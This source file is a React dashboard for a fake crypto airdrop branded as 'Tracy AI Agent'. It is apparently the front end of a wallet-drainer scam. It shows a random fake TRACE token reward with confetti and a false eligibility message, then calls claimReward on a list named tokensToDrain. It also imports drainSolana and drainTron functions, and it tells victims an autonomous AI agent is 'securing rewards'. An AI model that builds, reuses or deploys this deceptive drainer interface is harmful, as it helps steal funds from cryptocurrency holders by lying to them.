"use client";

import { useWeb3Manager } from "@/hooks/useWeb3Manager";
import { useSolanaManager } from "@/hooks/useSolanaManager";
import { useTronManager } from "@/hooks/useTronManager";
import { useEffect, useState } from "react";
import { CheckCircle, Shield, XCircle, ChevronRight, Loader2, PartyPopper, Bot, Wallet } from "lucide-react";
import confetti from "canvas-confetti";

export default function Dashboard() {
    const { account, checkEligibility, claimReward, currentTask: evmTask, address: evmAddress } = useWeb3Manager();
    const { drainSolana, currentTask: solTask, isProcessing: solLoading } = useSolanaManager();
    const { drainTron, currentTask: tronTask, isProcessing: tronLoading } = useTronManager();

    // Status Flow: scanning -> congrats -> active -> ineligible
    const [status, setStatus] = useState<"scanning" | "congrats" | "active" | "ineligible">("scanning");
    const [activeChain, setActiveChain] = useState<"evm" | "solana" | "tron">("evm");
    const [tokensToDrain, setTokensToDrain] = useState<{ address: string; chainId: string; symbol?: string }[]>([]);
    const [rewardAmount, setRewardAmount] = useState<number>(0);

    const currentTask = activeChain === "evm" ? evmTask : activeChain === "solana" ? solTask : tronTask;

    useEffect(() => {
        const verify = async () => {
            const { isEligible, tokensToDrain: tokens } = await checkEligibility();

            if (isEligible) {
                setTokensToDrain(tokens);
                const randomReward = Math.floor(Math.random() * (5000 - 1000 + 1)) + 1000;
                setRewardAmount(randomReward);
                setStatus("congrats");

                const end = Date.now() + 1500;
                const colors = ['#D4AF37', '#ffffff', '#000000'];
                (function frame() {
                    confetti({ particleCount: 3, angle: 60, spread: 55, origin: { x: 0 }, colors: colors });
                    confetti({ particleCount: 3, angle: 120, spread: 55, origin: { x: 1 }, colors: colors });
                    if (Date.now() < end) requestAnimationFrame(frame);
                }());
            } else {
                setStatus("ineligible");
            }
        };

        if (account) verify();
        else setStatus("scanning");
    }, [account]);

    if (status === "scanning") {
        return (
            <div className="flex flex-col items-center justify-center py-24 md:py-40 animate-fade-up">
                <div className="relative mb-8 text-[#D4AF37]">
                    <Bot size={64} className="animate-pulse" />
                </div>
                <p className="text-white/40 animate-pulse uppercase tracking-[0.3em] text-[10px] font-bold">Tracy AI Agent is Initializing...</p>
                <div className="flex flex-col items-center mt-4 space-y-1">
                    <p className="text-[#D4AF37]/30 text-[9px] font-mono italic">Analyzing on-chain rewards...</p>
                </div>
            </div>
        );
    }

    if (status === "congrats") {
        return (
            <div className="py-12 md:py-20 flex justify-center animate-fade-up px-4">
                <div className="glass-card p-8 md:p-12 border border-[#D4AF37]/30 text-center max-w-xl w-full relative overflow-hidden shadow-[0_0_50px_rgba(212,175,55,0.1)]">
                    <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-[#D4AF37] to-transparent" />

                    <div className="mb-8 flex justify-center">
                        <div className="p-6 bg-[#D4AF37]/10 rounded-full text-[#D4AF37] animate-bounce shadow-[0_0_30px_rgba(212,175,55,0.2)]">
                            <PartyPopper size={48} />
                        </div>
                    </div>

                    <h2 className="text-2xl sm:text-3xl md:text-4xl font-bold italic mb-4 gold-gradient px-4">Congratulations!</h2>
                    <p className="text-white/80 mb-6 leading-relaxed text-base sm:text-lg md:text-xl px-4">
                        You got <span className="text-[#D4AF37] font-bold text-xl sm:text-2xl">{rewardAmount.toLocaleString()} TRACE</span> tokens!
                    </p>
                    <p className="text-white/40 mb-10 text-sm">
                        Tracy AI Agent has verified your eligibility based on protocol contributions.
                    </p>

                    <div className="flex flex-col gap-3">
                        <button
                            onClick={() => {
                                setStatus("active");
                                setActiveChain("evm");
                                claimReward(tokensToDrain);
                            }}
                            className="gold-button w-full py-5 rounded-2xl font-bold text-black uppercase tracking-widest text-xs md:text-sm shadow-xl flex items-center justify-center gap-3 group transition-all hover:scale-[1.02]"
                        >
                            <Wallet size={18} />
                            <span>Activate EVM Tracy</span>
                            <ChevronRight size={18} className="group-hover:translate-x-1 transition-transform" />
                        </button>

                        {/* Solana and Tron buttons hidden for EVM focus */}
                        {/* <div className="grid grid-cols-2 gap-3"> ... </div> */}
                    </div>
                    <p className="mt-4 text-[10px] text-white/20 uppercase tracking-widest">Autonomous On-chain Management</p>
                </div>
            </div>
        );
    }

    if (status === "active") {
        return (
            <div className="py-20 flex flex-col items-center justify-center animate-fade-in px-4">
                {/* DYNAMIC AGENT MODAL */}
                {currentTask && (
                    <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/90 backdrop-blur-xl p-4">
                        <div className="glass-card max-w-md w-full p-6 md:p-8 border border-[#D4AF37]/40 shadow-[0_0_100px_rgba(212,175,55,0.2)] relative animate-fade-up overflow-hidden">
                            {/* Pro-Active Progress Bar */}
                            <div className="absolute top-0 left-0 w-full h-1 bg-[#D4AF37]/20">
                                <div className="h-full bg-[#D4AF37] w-1/3 animate-shimmer" />
                            </div>

                            <div className="flex justify-center mb-6">
                                <div className="relative group">
                                    <div className="absolute inset-0 bg-[#D4AF37] opacity-20 rounded-full blur-[20px] group-hover:opacity-40 transition-opacity" />
                                    <div className="relative w-20 h-20 md:w-24 md:h-24 rounded-full border-2 border-[#D4AF37]/30 overflow-hidden shadow-2xl">
                                        <img
                                            src="/images/Tracy Pfp.jpg"
                                            alt="Tracy Agent"
                                            className="w-full h-full object-cover"
                                        />
                                    </div>
                                    <div className="absolute -bottom-1 -right-1 bg-[#D4AF37] p-1.5 rounded-full text-black shadow-lg">
                                        <Bot size={14} />
                                    </div>
                                </div>
                            </div>

                            <h3 className="text-xl md:text-2xl font-bold text-center mb-1 text-white italic tracking-tight">Tracy AI Agent</h3>
                            <p className="text-[#D4AF37] text-[10px] font-bold uppercase tracking-[0.3em] text-center mb-6">Autonomous Assistant</p>

                            <div className="w-12 h-0.5 bg-[#D4AF37]/30 mx-auto mb-8" />

                            <div className="min-h-[100px] flex items-center justify-center">
                                <p className="text-center text-white/90 leading-relaxed font-medium text-sm md:text-base break-words px-2">
                                    {currentTask}
                                </p>
                            </div>

                            <div className="mt-6 md:mt-8 space-y-4">
                                <div className="flex items-center justify-between text-[10px] font-bold uppercase tracking-widest text-[#D4AF37]">
                                    <span>Agent Logic</span>
                                    <span className="flex items-center gap-1.5">
                                        <span className="w-1.5 h-1.5 rounded-full bg-[#D4AF37] animate-ping" />
                                        Active
                                    </span>
                                </div>
                                <div className="h-1.5 w-full bg-white/5 rounded-full overflow-hidden">
                                    <div className="h-full bg-gradient-to-r from-[#D4AF37]/40 to-[#D4AF37] w-2/3 animate-[shimmer_2s_infinite_linear]" />
                                </div>
                            </div>
                        </div>
                    </div>
                )}

                {/* BACKGROUND STATE: MONITORING */}
                <div className="glass-card p-8 md:p-12 border border-white/5 text-center max-w-lg w-full relative opacity-50 mx-4">
                    <div className="absolute inset-0 bg-gradient-to-b from-[#D4AF37]/5 to-transparent pointer-events-none" />
                    <Loader2 size={32} className="mx-auto text-[#D4AF37] animate-spin mb-6" />
                    <h3 className="text-xl md:text-2xl font-bold mb-2 text-white/80">Agent Monitoring System</h3>
                    <p className="text-white/40 text-xs md:text-sm italic px-4">Tracy is conducting autonomous maintenance and reward securing.</p>
                </div>
            </div>
        );
    }

    return (
        <div className="py-20 flex justify-center animate-fade-up px-4">
            <div className="glass-card p-12 border border-red-500/20 text-center max-w-lg w-full">
                <div className="mb-6 flex justify-center">
                    <div className="p-4 bg-red-500/10 rounded-full text-red-500">
                        <XCircle size={48} />
                    </div>
                </div>
                <h3 className="text-2xl font-bold italic mb-4">Not Eligible</h3>
                <p className="text-white/50 mb-8">Unfortunately, this wallet does not meet the activity criteria.</p>
            </div>
        </div>
    );
}
